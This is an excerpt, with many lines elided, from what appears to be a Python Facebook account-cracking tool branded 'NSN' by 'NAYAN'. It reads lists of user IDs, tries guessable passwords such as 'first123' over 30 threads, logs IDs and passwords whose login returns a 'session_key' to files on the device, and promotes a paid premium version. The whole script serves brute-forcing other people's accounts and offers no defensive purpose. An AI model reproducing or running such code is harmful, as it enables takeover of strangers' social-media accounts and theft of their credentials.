...
os.system('clear')
print('\n\033[1;97m [•] wait a few sec... \n [•] Join NSN facebook Group')
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system('xdg-open https://www.facebook.com/100010427028569')
      time.sleep(1)
      exit()
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;92mPut file example:  /sdcard/nayan.txt')
                                linex()
                                ...
                                #print(' Try Methods ')
                                linex()
                                print('\033[1;92m [1] Method 1  \n \033[1;34m[2] Method 2 \n \033[1;33m[3] Method 3 ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                clear()
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: \033[1;92mfirst last, \033[1;94mfirtslast, \033[1;97mfirst123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}:\033[1;97m '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mTOTAL IDS : \033[1;92m'+total_ids+f' \033[1;33m\033[1;36m\n\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mMethod     : \033[1;92m \033[1;92mM{mthd}')
                                        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mUSE \033[1;34m[\033[1;32mDATA\033[1;97m/\033[38;5;196mWIFI\033[1;34m] ')
                                        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE ')
                                        linex()
                                        for user in fo:
                                ...
                                os.system(f'xdg-open https://facebook.com/groups/nsn.team/{wx}');menu()
                        elif xd in ['2','02']:
                                os.system('xdg-open https://www.facebook.com/100010427028569');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://facebook.com/groups/nsn.team/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ')
                        else:
                        ...
                        linex()
                        tks = ("Hi NAYAN Sir, I Need To Buy Your Paid NSN PRO Tools Version 3.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        open('/sdcard/NAYAN-OK-M2.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[NAYAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NAYAN-OK-M3.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
